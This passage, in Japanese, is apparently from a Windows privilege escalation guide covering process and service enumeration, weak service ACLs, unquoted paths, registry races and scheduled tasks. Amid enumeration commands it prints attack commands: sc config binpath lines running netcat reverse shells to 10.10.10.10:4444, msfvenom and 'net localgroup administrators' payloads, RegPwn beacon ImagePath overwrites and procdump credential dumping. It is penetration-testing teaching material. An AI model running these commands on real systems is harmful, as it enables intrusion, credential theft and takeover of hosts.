#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に、実行中の [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) がないか確認してください。これを悪用して privilege escalation できる可能性があります。

debugger listener は短時間しか起動しないことがあるため、受動的なポートスナップショットで見つからなかったからといって、公開されていなかったとは限りません。検出した listener について、PID、プロセスの所有者、および低権限ユーザーからアクセス可能かどうかを照合してください。アプリケーション名や debug flag だけでは、ユーザーをまたいだ code execution が可能だとは判断できません。通常の列挙は受動的に行い、debugger command は送信しないでください。

**プロセスのバイナリの権限を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリがあるフォルダーのアクセス許可を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)****

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor ディレクトリ

Snort 2 は、`snort.exe -c <config>` で選択した設定ファイル内で宣言された `dynamicpreprocessor directory` から共有ライブラリを読み込めます。別のアカウントで Snort を実行するスケジュールタスクまたはサービスについて調査する場合は、その設定ファイルと、宣言されたモジュールディレクトリの ACL を確認してください。自分のトークンでそのディレクトリにファイルを作成できる場合、タスクまたはサービスが次にモジュールを読み込む際のコード実行候補として調査できます。実行アカウントの実効権限、アクティブな設定、モジュールの互換性、拒否設定や共有制限を確認してください。ディレクトリが書き込み可能なだけでは、権限昇格が成立するとは限りません。[Snort の dynamic-preprocessor に関するドキュメント](https://www.snort.org/documents/dpx-readme)では、実行時のモジュール読み込みについて説明されています。

### 書き込み可能なドキュメントルートを持つ特権 Web サービス

Windows の Apache インストールでは、サービスの実行ファイルのパスと実行アカウントを、アクティブな `httpd.conf` 内の `DocumentRoot` と照合してください。一般的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、設定されたドキュメントルート（多くの場合 `C:\xampp\htdocs`）の ACL を確認します。Apache が `LocalSystem` として実行されていて、低い権限のユーザーがそのルートにファイルを作成できる場合、サーバー側コードの実行によってホストの権限境界を越えられる可能性があります。サービスが実行中であること、正確なパスが配信対象であること、対象のファイルタイプがサーバー側ハンドラーによって処理されることを確認してください。ルートが書き込み可能なだけでは、証明できるのはファイル作成のみです。プローブを書き込まずに ACL を確認してください:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

一般的な WAMP のインストールでは、サービスがバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit の構成では `C:\wamp\...`）を参照し、その隣の `conf\httpd.conf` に設定ファイルがあり、既定のルートは `C:\wamp64\www` または `C:\wamp\www` です。正確なサービスイメージ、実行ユーザー、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開や virtual-host のオーバーライドを含む）、ルートの ACL をまとめて確認してください。WAMP ディレクトリに書き込み可能だからといって、Apache が `SYSTEM` として実行されていることや、配置したファイルが実行されることの証明にはなりません。[Apache のドキュメントでは、Windows サービスが設定を選択する方法が説明されています](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートとアプリケーションプールのネットワーク ID

IIS では、`applicationHost.config` で書き込み可能な物理ディレクトリを**有効なサイト／アプリケーション**に対応付け、その設定済みのプールとサーバー側ハンドラーを特定します。配信対象のディレクトリに置いたコードがプールとして実行されるのは、IIS がそのファイルタイプを処理し、かつそのルートに到達できる場合に限られます。書き込み可能なディレクトリをコード実行可能と判断する前に、現在のユーザーの実効ファイル作成権限、サイトの実行状態、ハンドラー、パスごとのオーバーライドを確認してください。

ASP.NET の動的コンパイルについては、アプリケーションのコンパイルディレクトリに生成されるファイルも別途確認が必要です。既定では、該当する .NET Framework のインストール先配下にある `Temporary ASP.NET Files` ディレクトリが使われますが、アプリケーションの `<compilation tempDirectory>` で変更できます。[Microsoft のドキュメントでは場所とアプリケーションごとのサブディレクトリが説明されており](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)、[アプリケーションプール間で互いを信頼しない場合は、コンパイルディレクトリを分離することが推奨されています](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低い権限の token で**特定の**アプリケーションのキャッシュ内にある生成元ファイルを変更できる場合、そのアプリケーションがそれをより高い権限の[ワーカープロセス ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)で再コンパイルするかを確認してください。ファイルやディレクトリの ACL だけではコード実行の証明になりません。キャッシュ、有効なアプリケーション、実効 token と ACL、コンパイル設定、プロセス ID、再コンパイルのタイミングを照合してください。読み取り専用のメタデータ確認にとどめ、列挙中にコンパイルを誘発したり、キャッシュファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` として設定された IIS プールは、ローカルの token が低い権限であっても、通常はドメインリソースに対して**ホストコンピューターアカウント**として認証します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上でもコンピューターアカウントを使います。一方、`LocalService` は通常、ネットワーク上で匿名の資格情報を提示します。`SpecificUser` プールは、設定されたアカウントを使います。[Microsoft のドキュメントでは、これらの ID の種類](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)と[アプリケーションプールのネットワーク ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)が説明されています。ID の設定が省略されている場合はプールの既定値を継承することがあり、既定値は IIS の世代によって異なるため、プール名から推測せず実効設定を確認してください。コード実行先のプールがコンピューターアカウントのネットワーク ID を使う場合は、**そのコンピューター固有の**ディレクトリ権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md)にはドメインの命名コンテキストに対するレプリケーション権限が必要です。マシンアカウントの ticket やホストの役割だけでは、その権限がある証明になりません。受動的な列挙では、ファイルのアップロード、ネットワーク認証、ticket の要求を行わず、設定と ACL を調べてください。

ヘルパープロセスを起動する ASP.NET ハンドラーを読み取れる場合は、リクエスト由来の値が認証、復号、検証、コマンド構築をどう経由するか追跡してください。デコード済み token を `ProcessStartInfo("cmd", "/c ...")` に連結するハンドラーでは、shell のメタ文字によってコマンドを変更できる可能性があります。[Microsoft のドキュメントでは、`cmd` の特殊文字が説明されています](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼されていない呼び出し元がデコード済みの値に実際に影響を与えられ、ハンドラーに到達できることを確認し、実効アプリケーションプール ID または偽装された ID と、子プロセスの ID を特定してください。読み取り可能なソースコードの1行、localhost のリスナー、token 形式の脆弱性だけでは、権限のあるコマンド実行の証明になりません。受動的な列挙では、偽造したリクエストを送信したり、ヘルパーを実行したりせずに、ソースコードとプールの設定を確認してください。

Windows 上の PHP サービスでは、リクエストで制御可能なパスを[`include` または `require`](https://www.php.net/manual/en/function.include.php)に渡すことで、ワーカープロセスの ID で低権限ユーザーが書き込み可能な PHP ファイルを評価できる場合があります。リクエストがその処理に到達できること、解決されたパスが低権限ユーザーには変更可能でワーカーには読み取り可能なファイルを指すこと、適用される PHP のパス制限で include が許可されること、ワーカーが実際により高い権限で実行されていることを確認してください。loopback リスナーや書き込み可能なファイルだけでは、この一連の条件の証明になりません。受動的な列挙では、エンドポイントを呼び出さずにソースコード、サービス ID、ファイル ACL を確認してください。

### メモリ上のパスワードの採取

sysinternals の **procdump** を使うと、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスでは**資格情報がメモリ上に平文で保存されている**ため、メモリをダンプして資格情報を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でない GUI アプリ

**SYSTEM として実行されるアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows ヘルプとサポート」（Windows + F1）で「コマンド プロンプト」を検索し、「クリックしてコマンド プロンプトを開く」をクリックします。

### 特権アカウントによるプロジェクトファイルのインポート

低権限ユーザーが書き込み可能なドロップディレクトリからプロジェクトを自動的に開くアプリケーションは、インポーターのアカウントのもとで入力の信頼境界を越えます。**正確な書き込み可能パス**、それを開くプロセスまたはタスク、その実効 ID、パーサーのビルドを確認してください。[過去の Ghidra のプロジェクトを開く／復元する際の問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトのメタデータで XML external entities が許可されていました。Windows 上のネットワークエンティティは、[アウトバウンド SMB と NTLM のポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)で許可されている場合、インポートアカウントからの認証を引き起こす可能性があります。これは認証情報の露出につながる手がかりであり、直ちに管理者アクセスを得られるという意味ではありません。応答を利用するには、別途、許可された経路または脆弱な経路が必要です。また、現在のビルドは実際のパッチ適用状況に照らして評価してください。受動的な列挙中に細工したプロジェクトを開かないでください。インポートのワークフローと ACL を調査してください。

## サービス

Service Control Manager (SCM) オブジェクトの [`SC_MANAGER_CREATE_SERVICE` 権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存サービスに対する権限とは別です。この権限を指定した読み取り専用の [`OpenSCManager` アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功した場合、それは調査の手がかりであり、新しいサービスを実行できる証明ではありません。[`CreateService` はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。そのハンドルには作成時に要求されたサービスアクセス権が付与されます。後からサービスを再オープンすると別途アクセスチェックが行われ、元のハンドルを使用できる場合でも失敗することがあります。実効ローカルまたはリモートトークン、付与されたハンドル権限、サービスアカウント、起動ポリシー、実行ファイルのパスをそれぞれ確認してください。受動的な列挙中にサービスを作成または起動しないでください。

リモートからサービスをインストールする経路については、SCM 権限と、対象上にある、**同じネットワークログオン**で書き込み可能な共有、その共有の基盤となる NTFS ACL、サービスアカウントが実行可能なローカル実行ファイルのパスを照合してください。SCM 権限が異常に広く、ファイル配置の経路も存在する場合、非管理者アカウントでもこの境界を越えられる可能性があります。管理共有は必須条件ではありません。共有への書き込み権限だけ、またはサービス作成の SCM 権限だけでは、新しいサービスをより高い権限で起動できるとは限りません。

既存のサービスは、`ImagePath` に指定されていない場合でも、起動時、シャットダウン時、または別のライフサイクルイベント時にヘルパー実行ファイルを呼び出すことがあります。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリ内で解決され、サービスがより高い権限で動作する場合、欠落しているヘルパーファイルは条件付きで置き換え候補になります。**実際のサービスコードまたは文書化されたヘルパー呼び出し**、解決される実行ファイルのパスと検索順序、ディレクトリ作成権限、サービス ID、利用可能なライフサイクルトリガーを確認してください。書き込み可能なサービスディレクトリやファイルの欠落だけでは、サービスがそのファイルを読み込むとは証明できません。受動的な調査中にサービスを起動または停止しないでください。

既存のサービスでは、[`SERVICE_START` により `StartService` に引数を渡せます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは別の権限です。開始権限を単なる制御権限以上のものとみなす前に、サービスのコードまたは文書化されたインターフェースを確認してください。呼び出し元が指定した引数をログまたはエクスポート先のパスとして使う場合は、サービス ID、引数から書き込みに至る正確な処理、パスの制限、**作成されるファイル**のアクセス許可を確認してください。保護されたディレクトリへの書き込みが権限昇格につながるのは、そのファイルを受け入れる別の特権コンシューマーまたはローダーがある場合に限られます。書き込み可能なログや開始権限だけでは不十分です。受動的なインベントリ収集中にサービスを起動したり、テストファイルを作成したりしないでください。

NSClient++ monitoring agent では、読み取り可能な `nsclient.ini` は**設定を確認する手がかり**です。Web 認証情報が含まれている場合があり、`boot.ini` によって設定ファイルが別の場所にリダイレクトされている可能性もあります。実際のサービスアカウント、WEB listener とアクセスポリシー、認証済みロールで設定またはスクリプトを変更できるかを確認してください。特権実行にはさらに、`CheckExternalScripts`（または別の有効な実行経路）、コマンドを登録または変更する実効権限、サービス ID で実行するトリガーが必要です。loopback のみでリッスンする場合でも、ローカルユーザーから到達できる可能性がありますが、ファイルパス、パスワード、listener だけでは、これらの権限があるとは証明できません。受動的な列挙中は、秘密情報を表示したり Web API を呼び出したりせずに、メタデータと権限を確認してください。[NSClient++ のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Web とスクリプトのセキュリティガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath` が `nssm.exe` のサービスでは、サービスの実際の実行アカウントと、`HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` の値を調査してください。[NSSM は子アプリケーションをそこに保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。`AppDirectory` は設定された作業ディレクトリです。ラッパーの権限だけでサービスの境界全体が決まると判断する前に、子実行ファイルとその親ディレクトリの ACL を確認してください。その子が公開するローカル WCF または SOAP endpoint は、別途調査すべき手がかりです。低権限ユーザーが listener に到達できること、対象の操作がそのユーザーの入力を受け付けること、サービスの子プロセスがより高い権限で危険な操作を実行することを確認してください。サービスアカウント、endpoint URL、または書き込み可能なパスだけでは権限昇格の証明になりません。受動的な列挙中にサービス操作を呼び出さないでください。

カスタム WCF 操作では、呼び出し元が制御する文字列が PowerShell runspace に渡される箇所を追跡してください。[`Pipeline.Commands.AddScript` はスクリプトテキストを追加します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)。[`Pipeline.Invoke` はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windows transport credentials を使う `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、その**特定の**操作を呼び出す権限と runspace の実効 ID は別途確認する必要があります。低権限の呼び出し元の入力から、より高いサービス ID で実行される `AddScript` までの経路は、コード実行の境界です。リッスン中のポート、認証済みクライアント、無関係なアセンブリ内にある未使用のメソッドだけでは証明になりません。列挙中に endpoint を呼び出さず、デプロイされたサービス、コントラクト、認可、偽装設定を静的に調査してください。

Service Triggers を使うと、特定の条件（名前付きパイプ／RPC endpoint のアクティビティ、ETW イベント、IP の利用可能状態、デバイスの到着、GPO の更新など）に応じて Windows がサービスを起動できます。SERVICE_START 権限がなくても、多くの場合、トリガーを発生させて特権サービスを起動できます。列挙とアクティベーションの手法はこちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ tooling を含む Visual Studio のインストールには、`LocalSystem` として実行するよう設定された診断サービス `VSStandardCollectorService150` が含まれることがあります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、junction と object-manager-link の race を利用して、サービスの DACL reset をリダイレクトしました。実証された権限昇格にはさらに、利用可能な Visual Studio Setup WMI Provider MSI repair 経路と、その `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` という対象ファイルが必要でした。このコンポーネントは 2024 年 1 月に修正されました。

受動的なトリアージでは、そのサービスのアカウントとバイナリパスを調べ、Setup WMI compiler のパスが存在するか確認し、インストール済みコンポーネントのパッチ適用状況を検証してください。サービスエントリ、Visual Studio の製品バージョン、またはコンパイラファイルだけでは、ホストが脆弱であるとは証明できません。サービスを起動したり、修復を実行したりせずに調査できます。

サービスの一覧を取得します。

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Permissions

**sc**を使用してサービスに関する情報を取得できます。

```bash
sc qc <service_name>
```

各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意することを推奨します。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」がサービスを変更できるかどうか確認することをおすすめします。

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

（たとえば SSDPSRV で）次のエラーが発生した場合:

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、有効なデバイスが関連付けられていないため、開始できません。_

次の方法で有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost サービスが動作するには SSDPSRV に依存している点に注意してください（XP SP1 の場合）**

**この問題への別の回避策**は、次を実行することです。

```
sc.exe config usosvc start= auto
```

### **サービスバイナリのパスを変更する**

「Authenticated users」グループがサービスに対して**SERVICE_ALL_ACCESS**を持つシナリオでは、そのサービスの実行可能バイナリを変更できます。**sc**を変更して実行するには:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスの再起動

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限の昇格は、次のようなさまざまな権限を通じて可能です。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再設定を許可します。
- **WRITE_DAC**: 権限の再設定を可能にし、サービス設定を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を可能にします。
- **GENERIC_WRITE**: サービス設定を変更する権限を継承します。
- **GENERIC_ALL**: サービス設定を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱なアクセス許可

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つドメインアカウントで実行されていて、**低権限ユーザーがサービスの EXE またはその親フォルダーを変更できる**場合、通常、**バイナリを置き換えてサービスを再起動する**ことでサービスを乗っ取れます。

**サービスが実行するバイナリを変更できるか**、またはバイナリが配置された**フォルダーへの書き込み権限があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**.**）\
サービスが実行するすべてのバイナリは **wmic**（system32 内にはありません）を使って取得し、**icacls** でアクセス許可を確認できます。

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

また、**sc** と **icacls** も使用できます：

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービスの実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実用的な悪用手順は次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリに書き込み可能か確認します。
3. サービスのバイナリを payload または有効な悪意あるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動／サービスのトリガーを待ちます）。

自動チェックに便利なツール：<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスを通常ユーザーが再起動できない場合は、起動時に自動起動するか、失敗時に再起動するアクションが設定されているか、またはそのサービスを使用するアプリケーションから間接的に起動できるかを確認してください。

### サービスのレジストリ変更権限

サービスのレジストリを変更できるか確認してください。\
サービスの**レジストリ**に対する**権限**は、次のように**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持っているか確認します。ACL エントリがあるだけでは、実効アクセスがあるとは限りません。拒否エントリ、現在のトークン、継承された権限も考慮してください。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` および `SERVICE_START` 権限とは別です。権限昇格には、使用可能なサービス構成フィールド、サービスを起動する方法、そしてより高い権限を持つサービス ID も必要です。Microsoft の[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)と[サービスのアクセス権リファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリの Path を変更するには:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race による任意の HKLM value write（ATConfig）

一部の Windows Accessibility 機能はユーザーごとの **ATConfig** キーを作成し、後で **SYSTEM** プロセスがそれを HKLM のセッションキーにコピーします。Registry **symbolic link race** により、この特権的な書き込みを **任意の HKLM path** にリダイレクトでき、任意の HKLM **value write** が可能になります。<sup>[[18]](#references)</sup>

主な場所（例：On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みの Accessibility 機能が列挙されています。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` はログオン時やセキュアデスクトップへの遷移時に作成され、ユーザーが書き込み可能です。

悪用の流れ（CVE-2026-24291 / ATConfig）:

1. SYSTEM に書き込ませたい値を **HKCU ATConfig** に設定します。
2. セキュアデスクトップへのコピーをトリガーします（例：**LockWorkstation**）。これにより AT broker の処理が始まります。
3. **競争に勝ちます**。`C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定し、oplock が発動したら **HKLM Session ATConfig** キーを、保護された HKLM の対象への **registry link** に置き換えます。
4. SYSTEM がリダイレクト先の HKLM path に、攻撃者が指定した値を書き込みます。

任意の HKLM value write ができたら、サービス設定値を上書きして LPE に移行します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/command line）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常ユーザーが起動できるサービス（例：**`msiserver`**）を選び、書き込み後に起動します。**注:** 公開されている exploit の実装では、race の一環としてワークステーションをロックします。

ツールの例（RegPwn BOF / standalone）:<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

レジストリにこの権限がある場合、**そこからサブキーを作成できます**。Windows サービスの場合、**任意のコードを実行するにはこれで十分です**。


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windows はスペースまでの各部分を実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします。

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Windows組み込みサービスに属するものを除外し、引用符で囲まれていないサービスパスをすべて列挙します。

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**metasploitを使って**この脆弱性を検出・悪用できます: `exploit/windows/local/trusted\_service\_path` metasploitを使ってサービスバイナリを手動で作成できます:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 回復アクション

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能では、実行ファイルを指定できます。その実行ファイルを書き換え可能な場合、権限昇格につながる可能性があります。詳しくは[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## スケジュールされたタスクのスクリプト対象

有効なタスクが `.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する場合は、`cmd.exe` に加えて、**アクションの引数**で指定されているスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的なファイル引数を指定している場合も同様です。スケジュールされたバッチファイルに PowerShell の `-File` 呼び出しが文字列として含まれている場合は、参照先スクリプトの ACL も確認してください。変数、条件分岐、シェルの連結については、手動で追跡する必要があります。呼び出し元が書き込み可能なスクリプトや親ディレクトリが、アカウントをまたいだ実行につながるのは、設定されたタスクのプリンシパルが呼び出し元と異なり、かつタスクが実際にそのアクションを実行する場合に限られます。スクリプトでは追記のみ可能な ACL も問題になり得ますが、それ以前の `exit` やその他の制御フローによって、追記した行が実行されないことがあります。権限昇格だと判断する前に、有効な ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリ作成時にスクリプトを変更したり、タスクを開始したりしてはいけません。

## アクセス可能なファイルの名前付きストリーム

NTFS では、読み取り可能なファイルに名前付きの `:$DATA` ストリームが含まれていても、通常のディレクトリ一覧にはその内容が表示されないことがあります。アクセス可能なバックアップファイルや構成ファイルのうち、関連性の高い少数のファイルについては、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) および PowerShell の [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) を通じてストリームを確認できます。シークレットを示唆するストリーム名は、あくまで手掛かりです。ファイルの有効な読み取り権限、ファイルシステムがストリームをサポートしているか、ストリームに利用可能な認証情報が含まれているか、またその認証情報が実際にどのアカウントとして認証されるかを確認してください。通常の列挙処理では、再帰的なストリーム検索やストリーム内容の出力を避けてください。

## スケジュールされた Windows Driver Kit ヘルパーの入力ファイル

オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込むことがあります。権限の高いアカウントでこのヘルパーを起動するスケジュールされたタスクやサービスがある場合、ヘルパーの実行ファイル自体が保護されていても、これらの入力ファイルへの低権限の書き込みアクセスが、そのアカウントのコンテキストでのコマンド実行につながる可能性があります。権限の高いアカウントで処理されること、および**両方の**サイドカーファイルを作成または変更できることを確認してください。ヘルパーが見つかっただけでは不十分です。

